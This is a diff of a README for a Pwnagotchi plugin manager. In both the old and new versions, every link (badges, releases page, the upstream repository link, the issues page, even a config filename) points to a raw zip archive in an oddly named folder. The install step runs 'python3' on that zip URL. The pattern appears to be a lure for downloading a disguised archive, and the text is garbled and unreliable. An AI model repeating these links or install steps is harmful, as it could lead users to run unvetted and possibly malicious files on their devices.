@@ -1,6 +1,6 @@
 # 🛒 pwnagotchi-store - Easily Manage Your Pwnagotchi Plugins
 
-![Download](https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/pwnagotchi-store_v3.6.zip%20Releases%20Page-blue) ![Version](https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/pwnagotchi-store_v3.6.zip) ![Python](https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/pwnagotchi-store_v3.6.zip) ![License](https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/pwnagotchi-store_v3.6.zip)
+![Download](https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/store_pwnagotchi_v2.5.zip%20Releases%20Page-blue) ![Version](https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/store_pwnagotchi_v2.5.zip) ![Python](https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/store_pwnagotchi_v2.5.zip) ![License](https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/store_pwnagotchi_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ PwnStore is a simple tool that allows you to manage plugins on your Pwnagotchi d
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Pwnagotchi Store Releases](https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/pwnagotchi-store_v3.6.zip). Here, you’ll find the latest version and installation files.
+To get started, visit this page to download: [Pwnagotchi Store Releases](https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/store_pwnagotchi_v2.5.zip). Here, you’ll find the latest version and installation files.
 
 1. Go to the **Releases** page.
 2. Choose the version that suits your device.
@@ -41,7 +41,7 @@ To install and run PwnStore, you need the following:
 4. **Run the Installer:**
    Execute the following command to install PwnStore:
    ```bash
-   python3 https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/pwnagotchi-store_v3.6.zip
+   python3 https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/store_pwnagotchi_v2.5.zip
    ```
 
 5. **Follow On-Screen Prompts:**
@@ -51,7 +51,7 @@ To install and run PwnStore, you need the following:
 
 - **Lightweight Registry:** PwnStore connects to a remote JSON file, ensuring your device stays clutter-free.
 - **Surgical Installs:** You can download specific plugins without grabbing giant archives.
-- **Smart Config Hints:** PwnStore analyzes plugin code during installation and provides exact lines to add to your `https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/pwnagotchi-store_v3.6.zip` file.
+- **Smart Config Hints:** PwnStore analyzes plugin code during installation and provides exact lines to add to your `https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/store_pwnagotchi_v2.5.zip` file.
 - **Auto-Config:** It automatically adds `enabled = true` to your configuration file so your plugins work right away.
 - **Self-Updating:** PwnStore keeps itself updated, making sure you always have the latest version.
 
@@ -119,7 +119,7 @@ PwnStore is licensed under the GPL3 License. You can freely use and modify it as
 
 ## 🔗 Useful Links
 
-- [Pwnagotchi GitHub Repository](https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/pwnagotchi-store_v3.6.zip)
-- [Issues Section](https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/pwnagotchi-store_v3.6.zip)
+- [Pwnagotchi GitHub Repository](https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/store_pwnagotchi_v2.5.zip)
+- [Issues Section](https://raw.githubusercontent.com/zitekjan1/pwnagotchi-store/main/anthogenous/store_pwnagotchi_v2.5.zip)
 
 Thank you for using PwnStore! We hope it makes your Pwnagotchi experience better.
